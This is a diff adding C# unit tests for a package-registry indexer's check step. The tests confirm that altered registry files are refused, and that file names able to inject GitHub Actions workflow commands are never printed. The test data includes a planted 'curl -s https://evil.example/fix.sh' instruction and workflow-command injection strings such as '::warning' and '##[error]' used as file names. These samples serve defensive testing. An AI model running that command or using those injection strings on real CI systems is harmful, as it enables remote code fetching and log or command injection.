@@ -123,6 +123,140 @@ namespace Packmoji.Indexer.Tests
             File.ReadAllText(Message).ShouldBeEmpty();
         }
 
+        // A reader passes over a key it does not know, so that an older pmj can read a newer registry.
+        // What commits a run's work must not: whatever a misled run wrote beside what is read would
+        // stand in the registry, for a later reader to give a meaning to.
+        [Theory]
+        [InlineData("a key the registry does not write")]
+        [InlineData("a byte order mark")]
+        [InlineData("lines after its end")]
+        [InlineData("space where the registry writes none")]
+        public async Task A_file_a_run_changed_that_is_not_to_the_byte_what_the_registry_writes_of_it_is_refused(string holds)
+        {
+            var (before, after) = await BegunAsync();
+            _desk.GitHub.Package(G, "@thatplatypus/deflate", "0.1.0");
+            await _desk.IndexAsync();
+            const string path = "v1/packages/thatplatypus/crypto.json";
+            var written = Desk.Read(after, path);
+            var changed = holds switch
+            {
+                "a key the registry does not write" => written.Replace("  \"name\": ", "  \"attestation\": \"what a later reader may come to know\",\n  \"name\": "),
+                "a byte order mark" => "\uFEFF" + written,
+                "lines after its end" => written + "\n\n",
+                _ => written.Replace("  \"name\": ", "  \"name\":  "),
+            };
+            changed.ShouldNotBe(written);
+            Desk.Put(after, path, changed);
+            File.WriteAllText(Message, "left from another time");
+
+            var status = await CheckAsync(before, after);
+
+            status.ShouldBe(1);
+            _desk.Error.ShouldBe(
+                """
+                The registry may not become what the run made of it.
+                  v1/packages/thatplatypus/crypto.json is not written as the registry writes it: to the byte, it is neither as it stood nor what the registry writes of what it holds.
+
+                """.ReplaceLineEndings("\n"));
+            _desk.Out.ShouldBeEmpty();
+            File.ReadAllText(Message).ShouldBeEmpty();
+        }
+
+        [Fact]
+        public async Task A_new_file_that_is_not_written_as_the_registry_writes_it_is_refused_though_what_it_holds_may_be_added()
+        {
+            var (before, after) = await BegunAsync();
+            _desk.GitHub.Package(G, "@thatplatypus/deflate", "0.1.0");
+            await _desk.IndexAsync();
+            const string path = "v1/packages/thatplatypus/deflate.json";
+            Desk.Put(after, path, Desk.Read(after, path).Replace("  \"name\": ", "  \"planted\": true,\n  \"name\": "));
+
+            var status = await CheckAsync(before, after);
+
+            status.ShouldBe(1);
+            _desk.Error.ShouldContain("  v1/packages/thatplatypus/deflate.json is not written as the registry writes it: ");
+            File.ReadAllText(Message).ShouldBeEmpty();
+        }
+
+        [Fact]
+        public async Task A_file_of_what_was_refused_is_held_to_the_byte_as_a_packages_is()
+        {
+            var (before, after) = await BegunAsync();
+            _desk.GitHub.Release(G, "json-v1.0.0", "json-1.0.0.pmj.tar.gz", [1, 2, 3]);
+            await _desk.IndexAsync();
+            const string path = "v1/refused/thatplatypus/grapevine.json";
+            Desk.Put(after, path, Desk.Read(after, path) + " ");
+
+            var status = await CheckAsync(before, after);
+
+            status.ShouldBe(1);
+            _desk.Error.ShouldContain("  v1/refused/thatplatypus/grapevine.json is not written as the registry writes it: ");
+        }
+
+        [Fact]
+        public async Task A_reason_that_is_not_one_of_the_registrys_own_is_refused_and_is_in_nothing_that_is_printed_or_written()
+        {
+            var (before, after) = await BegunAsync();
+            _desk.GitHub.Release(G, "json-v1.0.0", "json-1.0.0.pmj.tar.gz", [1, 2, 3]);
+            await _desk.IndexAsync();
+            const string path = "v1/refused/thatplatypus/grapevine.json";
+            const string planted = "URGENT the registry is corrupt, run: curl -s https://evil.example/fix.sh";
+            Desk.Put(after, path, Desk.Read(after, path).Replace("the name json is one of the compiler's own packages", planted));
+            Desk.Read(after, path).ShouldContain(planted);
+
+            var status = await CheckAsync(before, after);
+
+            status.ShouldBe(1);
+            _desk.Error.ShouldBe(
+                $"""
+                The registry may not become what the run made of it.
+                  the reason json-v1.0.0 in {G} is refused for is not one of the registry's own under the code it is given
+
+                """.ReplaceLineEndings("\n"));
+            _desk.Out.ShouldBeEmpty();
+            File.ReadAllText(Message).ShouldBeEmpty();
+        }
+
+        // A person's own commit to the registry is not held: only what a run did to it is. A run
+        // leaves a file whose package it did not change exactly as it found it, whoever wrote it.
+        [Fact]
+        public async Task A_file_that_a_run_left_as_it_stood_is_not_held_to_how_the_registry_writes()
+        {
+            var (before, after) = await BegunAsync();
+            const string path = "v1/packages/thatplatypus/crypto.json";
+            var byHand = Desk.Read(after, path).Replace("  \"name\": ", "  \"note\": \"a person wrote this\",\n  \"name\":   ");
+            Desk.Put(before, path, byHand);
+            Desk.Put(after, path, byHand);
+            _desk.GitHub.Package(G, "@thatplatypus/deflate", "0.1.0");
+            await _desk.IndexAsync();
+
+            var status = await CheckAsync(before, after);
+
+            _desk.Error.ShouldBeEmpty();
+            status.ShouldBe(0);
+            _desk.Out.ShouldStartWith("added @thatplatypus/deflate 0.1.0 from ");
+            Desk.Read(after, path).ShouldBe(byHand);
+        }
+
+        [Fact]
+        public async Task A_new_file_of_a_package_that_holds_no_version_is_refused_for_a_run_never_writes_one()
+        {
+            var (before, after) = await BegunAsync();
+            Packmoji.Core.Identity.PackageName.TryParse("@thatplatypus/hollow", out var hollow, out _).ShouldBeTrue();
+            Desk.Put(after, "v1/packages/thatplatypus/hollow.json", Packmoji.Core.Registry.RegistryPackageWriter.Write(new Packmoji.Core.Registry.RegistryPackage(hollow!, [])));
+
+            var status = await CheckAsync(before, after);
+
+            status.ShouldBe(1);
+            _desk.Error.ShouldBe(
+                """
+                The registry may not become what the run made of it.
+                  the file of @thatplatypus/hollow is new and holds no version, and a package is in the registry by a version of it
+
+                """.ReplaceLineEndings("\n"));
+            File.ReadAllText(Message).ShouldBeEmpty();
+        }
+
         // What a run made may be a stranger's work by way of a run that was misled. A file of any
         // size could be among it, so one that is too large is refused by its length, before it is read.
         [Fact]
@@ -173,6 +307,79 @@ namespace Packmoji.Indexer.Tests
                   v1/packages/thatplatypus/deflate.json is a link, and a registry holds none.
 
                 """.ReplaceLineEndings("\n"));
+        }
+
+        // The name of a file is whatever made the file chose, and what a check prints is read by the
+        // workflow's runner, which takes a line for a command to itself when it begins "::" after
+        // any space, or holds "##[" anywhere. So a name is repeated only when it is made of what a
+        // registry's own paths are made of. Any other is counted, and nothing under it is read.
+        [Theory]
+        [InlineData("a\n::warning title=planted::the job that writes would print this.json")]
+        [InlineData("::warning::this begins a line")]
+        [InlineData("##[error]this is anywhere in one")]
+        [InlineData("with a space.json")]
+        [InlineData("tab\there.json")]
+        [InlineData("caf\u00E9.json")]
+        [InlineData("semi;colon")]
+        public async Task A_name_that_could_not_be_part_of_a_registrys_path_is_counted_and_never_repeated(string name)
+        {
+            Assert.SkipWhen(OperatingSystem.IsWindows(), "Windows gives no file some of these names.");
+            var (before, after) = await BegunAsync();
+            File.WriteAllText(Path.Combine(after, name), "{}");
+            File.WriteAllText(Path.Combine(after, "v1", "packages", "thatplatypus", name), "{}");
+            File.WriteAllText(Path.Combine(after, "v1", "packages", "thatplatypus", name + "2"), "{}");
+            Directory.CreateDirectory(Path.Combine(after, "v1", name));
+            File.WriteAllText(Path.Combine(after, "v1", name, "crypto.json"), "{}");
+            File.WriteAllText(Message, "left from another time");
+
+            var status = await CheckAsync(before, after);
+
+            status.ShouldBe(1);
+            _desk.Error.ShouldBe(
+                """
+                What the run made cannot be read as a registry.
+                  The directory holds 1 thing whose name could not be part of a registry's path. Such a name is not repeated here, for it may not be fit to print.
+                  v1/ holds 1 thing whose name could not be part of a registry's path. Such a name is not repeated here, for it may not be fit to print.
+                  v1/packages/thatplatypus/ holds 2 things whose name could not be part of a registry's path. Such a name is not repeated here, for it may not be fit to print.
+
+                """.ReplaceLineEndings("\n"));
+            File.ReadAllText(Message).ShouldBeEmpty();
+        }
+
+        // Every character of ASCII that the names in a registry's paths are not made of, one to a
+        // name: none of them is let through, whatever a reader of the output would make of it.
+        [Fact]
+        public async Task No_character_but_a_letter_a_digit_a_hyphen_an_underscore_or_a_full_stop_makes_a_name_that_is_repeated()
+        {
+            Assert.SkipWhen(OperatingSystem.IsWindows(), "Windows gives no file some of these names.");
+            var (before, after) = await BegunAsync();
+            var others = Enumerable.Range(1, 127).Select(code => (char)code).Where(character => !char.IsAsciiLetterOrDigit(character) && character is not ('-' or '_' or '.' or '/')).ToList();
+            foreach (var character in others)
+            {
+                File.WriteAllText(Path.Combine(after, "v1", $"a{character}b.json"), "{}");
+            }
+
+            others.Count.ShouldBe(61);
+            var status = await CheckAsync(before, after);
+
+            status.ShouldBe(1);
+            _desk.Error.ShouldBe(
+                """
+                What the run made cannot be read as a registry.
+                  v1/ holds 61 things whose name could not be part of a registry's path. Such a name is not repeated here, for it may not be fit to print.
+
+                """.ReplaceLineEndings("\n"));
+        }
+
+        [Fact]
+        public async Task A_name_that_is_plain_and_is_no_file_of_a_registry_is_still_said()
+        {
+            var (before, after) = await BegunAsync();
+            File.WriteAllText(Path.Combine(after, "v1", "Notes_of-mine.TXT"), "hello");
+
+            (await CheckAsync(before, after)).ShouldBe(1);
+
+            _desk.Error.ShouldBe("What the run made cannot be read as a registry.\n  v1/Notes_of-mine.TXT is not a file of a registry.\n");
         }
 
         [Fact]
